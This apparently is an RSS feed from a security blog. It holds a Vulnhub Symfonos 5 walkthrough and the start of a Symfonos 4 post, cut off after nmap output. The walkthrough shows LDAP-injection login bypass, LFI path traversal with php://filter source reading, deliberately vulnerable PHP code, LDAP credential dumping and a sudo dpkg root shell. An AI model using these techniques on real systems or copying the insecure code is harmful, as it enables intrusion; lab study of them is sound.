@@ -1,0 +1,526 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>LFI on ikuamike</title><link>https://blog.ikuamike.io/tags/lfi/</link><description>Recent content in LFI on ikuamike</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>© Michael Ikua</copyright><lastBuildDate>Wed, 17 Feb 2021 21:54:20 +0300</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/lfi/index.xml" rel="self" type="application/rss+xml"/><item><title>Vulnhub: Symfonos 5</title><link>https://blog.ikuamike.io/posts/2021/symfonos5/</link><pubDate>Wed, 17 Feb 2021 21:54:20 +0300</pubDate><guid>https://blog.ikuamike.io/posts/2021/symfonos5/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Difficulty&lt;/th>
+&lt;th>Release Date&lt;/th>
+&lt;th>Author&lt;/th>
+&lt;th>Machine link&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Beginner&lt;/td>
+&lt;td>2 Mar 2020&lt;/td>
+&lt;td>Zayotic&lt;/td>
+&lt;td>&lt;a href="https://vulnhub.com/entry/symfonos-52,415/">https://vulnhub.com/entry/symfonos-52,415/&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h1 id="summary">Summary&lt;/h1>
+&lt;p>In this box, we first perform ldap injection on the web application to bypass the login page. Then we are able to read
+local files by abusing a local file inclusion vulnerability with php base64 filter. From one of the php files we get
+ldap credentials that we used to authenticate to ldap and dump entries. From the entries we get a base64 encoded
+password that we could use to ssh into the machine. For privilege escalation to a root shell we abused sudo permission granted on
+dpkg.&lt;/p>
+&lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
+&lt;p>Nmap&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.191.132
+Host is up &lt;span style="color:#f92672">(&lt;/span>0.0019s latency&lt;span style="color:#f92672">)&lt;/span>.
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 &lt;span style="color:#f92672">(&lt;/span>protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
+| ssh-hostkey:
+| &lt;span style="color:#ae81ff">2048&lt;/span> 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
+| &lt;span style="color:#ae81ff">256&lt;/span> a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
+|_ &lt;span style="color:#ae81ff">256&lt;/span> 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
+80/tcp open http Apache httpd 2.4.29 &lt;span style="color:#f92672">((&lt;/span>Ubuntu&lt;span style="color:#f92672">))&lt;/span>
+|_http-server-header: Apache/2.4.29 &lt;span style="color:#f92672">(&lt;/span>Ubuntu&lt;span style="color:#f92672">)&lt;/span>
+|_http-title: Site doesn&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>t have a title &lt;span style="color:#f92672">(&lt;/span>text/html&lt;span style="color:#f92672">)&lt;/span>.
+389/tcp open ldap OpenLDAP 2.2.X - 2.3.X
+636/tcp open ldapssl?
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;h2 id="389636-ldap">389,636 (LDAP)&lt;/h2>
+&lt;p>Doing some basic enumeration on ldap without credentials we only get the domain name. We&amp;rsquo;ll probably
+get back to it incase we land on some credentials.&lt;/p>
+&lt;p>&lt;strong>nmap scripts&lt;/strong>:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nmap -p 389,636 --script ldap-* 192.168.191.132
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-2.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>&lt;strong>ldapsearch&lt;/strong>:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ldapsearch -h 192.168.191.132 -D &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span> -w &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span> -b &lt;span style="color:#e6db74">&amp;#34;DC=symfonos,DC=local&amp;#34;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-3.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;h2 id="80-http">80 (HTTP)&lt;/h2>
+&lt;p>Opening the site on the browser, we only get a plain page with an image.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-4.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Performing a directory/file bruteforce using ffuf, we discover new files.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ffuf -ic -c -u http://192.168.191.132/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e /,.php,.html -t &lt;span style="color:#ae81ff">50&lt;/span> | tee root.ffuf
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Accessing /home.php we are redirected to admin.php which has a login form.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-5.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>I tried out credential bruteforce and sql injection auth bypass techniques but none of them were successful. I
+then thought to try out ldap injection. Since we have ldap running on this host it could be a valid path.&lt;/p>
+&lt;p>The application performs authentication insecurely by using GET requests to login.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-6.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Setting the username and password to &lt;code>*&lt;/code> we successfully login.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-7.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>We get redirected to home.php which doesn&amp;rsquo;t have much, but clicking on portraits we see interesting functionality.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-8.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>The url parameter takes in a url, changing the input to &lt;code>../../../../etc/passwd&lt;/code> we can read the passwd file. This confirms
+we can abuse LFI to access other files on disk by directory traversal.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-9.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>I tried accessing log files to try for RCE like the previous boxes but nothing came up. We can still use this to read
+files so we can check the source code of the app.&lt;/p>
+&lt;p>Accessing the php files directly just executes them, so we need to use php wrappers.&lt;/p>
+&lt;p>&lt;strong>home.php&lt;/strong>&lt;/p>
+&lt;pre>&lt;code>http://192.168.191.132/home.php?url=php://filter/convert.base64-encode/resource=home.php
+&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
+&lt;span style="color:#a6e22e">session_start&lt;/span>();
+&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">isset&lt;/span>($_SESSION[&lt;span style="color:#e6db74">&amp;#39;loggedin&amp;#39;&lt;/span>])){
+&lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Location: admin.php&amp;#34;&lt;/span>);
+&lt;span style="color:#66d9ef">exit&lt;/span>;
+}
+&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#66d9ef">empty&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#34;url&amp;#34;&lt;/span>]))
+{
+$r &lt;span style="color:#f92672">=&lt;/span> $_GET[&lt;span style="color:#e6db74">&amp;#34;url&amp;#34;&lt;/span>];
+$result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">file_get_contents&lt;/span>($r);
+}
+&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;html&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;head&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34; href=&amp;#34;/static/bootstrap.min.css&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/head&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;body&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;nav class=&amp;#34;navbar navbar-expand-lg navbar-dark bg-dark&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;navbar-brand&amp;#34; href=&amp;#34;home.php&amp;#34;&amp;gt;symfonos&amp;lt;/a&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;button class=&amp;#34;navbar-toggler&amp;#34; type=&amp;#34;button&amp;#34; data-toggle=&amp;#34;collapse&amp;#34; data-target=&amp;#34;#navbarColor02&amp;#34; aria-controls=&amp;#34;navbarColor02&amp;#34; aria-expanded=&amp;#34;false&amp;#34; aria-label=&amp;#34;Toggle navigation&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;span class=&amp;#34;navbar-toggler-icon&amp;#34;&amp;gt;&amp;lt;/span&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/button&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;collapse navbar-collapse&amp;#34; id=&amp;#34;navbarColor02&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;ul class=&amp;#34;navbar-nav mr-auto&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;home.php&amp;#34;&amp;gt;Home&amp;lt;/a&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/li&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;home.php?url=http://127.0.0.1/portraits.php&amp;#34;&amp;gt;Portraits&amp;lt;/a&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/li&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;logout.php&amp;#34;&amp;gt;Logout&amp;lt;/a&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/li&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/ul&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/nav&amp;gt;&amp;lt;br /&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;center&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;?php
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">if ($result){
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">echo $result;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">} else {
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">echo &amp;#34;&amp;lt;h3&amp;gt;Under Developement&amp;lt;/h3&amp;gt;&amp;#34;;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">} ?&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/center&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/body&amp;gt;
+&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>admin.php&lt;/strong>&lt;/p>
+&lt;pre>&lt;code>http://192.168.191.132/home.php?url=php://filter/convert.base64-encode/resource=admin.php
+&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
+&lt;span style="color:#a6e22e">session_start&lt;/span>();
+&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_SESSION[&lt;span style="color:#e6db74">&amp;#34;loggedin&amp;#34;&lt;/span>]) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> $_SESSION[&lt;span style="color:#e6db74">&amp;#34;loggedin&amp;#34;&lt;/span>] &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>){
+&lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;location: home.php&amp;#34;&lt;/span>);
+&lt;span style="color:#66d9ef">exit&lt;/span>;
+}
+&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">authLdap&lt;/span>($username, $password) {
+$ldap_ch &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_connect&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;ldap://172.18.0.22&amp;#34;&lt;/span>);
+&lt;span style="color:#a6e22e">ldap_set_option&lt;/span>($ldap_ch, &lt;span style="color:#a6e22e">LDAP_OPT_PROTOCOL_VERSION&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>);
+&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>$ldap_ch) {
+&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
+}
+$bind &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_bind&lt;/span>($ldap_ch, &lt;span style="color:#e6db74">&amp;#34;cn=admin,dc=symfonos,dc=local&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;qMDdyZh3cT6eeAWD&amp;#34;&lt;/span>);
+&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>$bind) {
+&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
+}
+$filter &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;(&amp;amp;(uid=&lt;/span>&lt;span style="color:#e6db74">$username&lt;/span>&lt;span style="color:#e6db74">)(userPassword=&lt;/span>&lt;span style="color:#e6db74">$password&lt;/span>&lt;span style="color:#e6db74">))&amp;#34;&lt;/span>;
+$result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_search&lt;/span>($ldap_ch, &lt;span style="color:#e6db74">&amp;#34;dc=symfonos,dc=local&amp;#34;&lt;/span>, $filter);
+&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>$result) {
+&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
+}
+$info &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_get_entries&lt;/span>($ldap_ch, $result);
+&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>($info) &lt;span style="color:#f92672">||&lt;/span> ($info[&lt;span style="color:#e6db74">&amp;#34;count&amp;#34;&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)) {
+&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
+}
+&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">TRUE&lt;/span>;
+}
+&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;username&amp;#39;&lt;/span>]) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;password&amp;#39;&lt;/span>])){
+$username &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">urldecode&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;username&amp;#39;&lt;/span>]);
+$password &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">urldecode&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;password&amp;#39;&lt;/span>]);
+$bIsAuth &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">authLdap&lt;/span>($username, $password);
+&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span> $bIsAuth ) {
+$msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Invalid login&amp;#34;&lt;/span>;
+} &lt;span style="color:#66d9ef">else&lt;/span> {
+$_SESSION[&lt;span style="color:#e6db74">&amp;#34;loggedin&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
+&lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;location: home.php&amp;#34;&lt;/span>);
+&lt;span style="color:#66d9ef">exit&lt;/span>;
+}
+}
+&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;html&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;head&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34; href=&amp;#34;/static/bootstrap.min.css&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/head&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;body&amp;gt;&amp;lt;br /&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;row justify-content-center&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-8&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;card&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;card-header&amp;#34;&amp;gt;Login&amp;lt;/div&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;card-body&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;form action=&amp;#34;admin.php&amp;#34; method=&amp;#34;GET&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;form-group row&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;label for=&amp;#34;email_address&amp;#34; class=&amp;#34;col-md-4 col-form-label text-md-right&amp;#34;&amp;gt;Username&amp;lt;/label&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-6&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;input type=&amp;#34;text&amp;#34; id=&amp;#34;username&amp;#34; class=&amp;#34;form-control&amp;#34; name=&amp;#34;username&amp;#34; required autofocus&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;form-group row&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;label for=&amp;#34;password&amp;#34; class=&amp;#34;col-md-4 col-form-label text-md-right&amp;#34;&amp;gt;Password&amp;lt;/label&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-6&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;input type=&amp;#34;password&amp;#34; id=&amp;#34;password&amp;#34; class=&amp;#34;form-control&amp;#34; name=&amp;#34;password&amp;#34; required&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-6 offset-md-4&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;button type=&amp;#34;submit&amp;#34; class=&amp;#34;btn btn-primary&amp;#34;&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> Login
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/button&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/form&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;center&amp;gt;&amp;lt;strong&amp;gt;&amp;lt;?php echo $msg; ?&amp;gt;&amp;lt;/strong&amp;gt;&amp;lt;/center&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/div&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/body&amp;gt;
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/html&amp;gt;
+&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>From admin.php we get credentials that can be used on ldap.&lt;/p>
+&lt;h1 id="getting-shell-as-zeus">Getting shell as zeus&lt;/h1>
+&lt;p>With the credentials admin:qMDdyZh3cT6eeAWD, we get more output from ldap:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ldapsearch -x -h 192.168.191.132 -D &lt;span style="color:#e6db74">&amp;#34;CN=admin,DC=symfonos,DC=local&amp;#34;&lt;/span> -w qMDdyZh3cT6eeAWD -b &lt;span style="color:#e6db74">&amp;#34;DC=symfonos,DC=local&amp;#34;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-10.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>From the output, the userPassword is base64 encoded. After decoding it we get &lt;code>cetkKf4wCuHC9FET&lt;/code> and can login
+as zeus via ssh.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-11.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;h1 id="privilege-escalation">Privilege Escalation&lt;/h1>
+&lt;p>Running &lt;code>sudo -l&lt;/code>, we see that zeus has sudo permissions to run dpkg with no password.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-12.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>From &lt;a href="https://gtfobins.github.io/gtfobins/dpkg/" target="_blank" rel="noopener">gtfobins&lt;/a>
+we only need to execute the below commands to
+abuse this.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo dpkg -l
+!/bin/bash
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-13.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;h1 id="extras">Extras&lt;/h1>
+&lt;p>When accessing the passwd file, we couldn&amp;rsquo;t see any user with home directory in /home looking at the configuration
+postexploitation we see that the services are running in docker containers.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-14.png" alt="symfonos" class="center" style="border-radius: 8px;" /></content></item><item><title>Vulnhub: Symfonos 4</title><link>https://blog.ikuamike.io/posts/2021/symfonos4/</link><pubDate>Mon, 15 Feb 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/symfonos4/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Difficulty&lt;/th>
+&lt;th>Release Date&lt;/th>
+&lt;th>Author&lt;/th>
+&lt;th>Machine link&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Intermediate&lt;/td>
+&lt;td>20 Aug 2019&lt;/td>
+&lt;td>Zayotic&lt;/td>
+&lt;td>&lt;a href="https://vulnhub.com/entry/symfonos-4,347/">https://vulnhub.com/entry/symfonos-4,347/&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h1 id="summary">Summary&lt;/h1>
+&lt;p>For this box, some directory bruteforce is needed to discover some php files. One of the php files has an lfi
+vulnerability but can only be access by authenticating to the other page. The login form can be bypassed and
+we exploit the lfi. For that we poison ssh logs for exploitation to rce. For privilege escalation we exploit
+a python web app running locally as root using insecure deserialization of the cookie by jsonpickle.&lt;/p>
+&lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
+&lt;p>Nmap&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.56.105
+Host is up &lt;span style="color:#f92672">(&lt;/span>0.00033s latency&lt;span style="color:#f92672">)&lt;/span>.
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.9p1 Debian &lt;span style="color:#ae81ff">10&lt;/span> &lt;span style="color:#f92672">(&lt;/span>protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
+| ssh-hostkey:
+| &lt;span style="color:#ae81ff">2048&lt;/span> f9:c1:73:95:a4:17:df:f6:ed:5c:8e:8a:c8:05:f9:8f &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
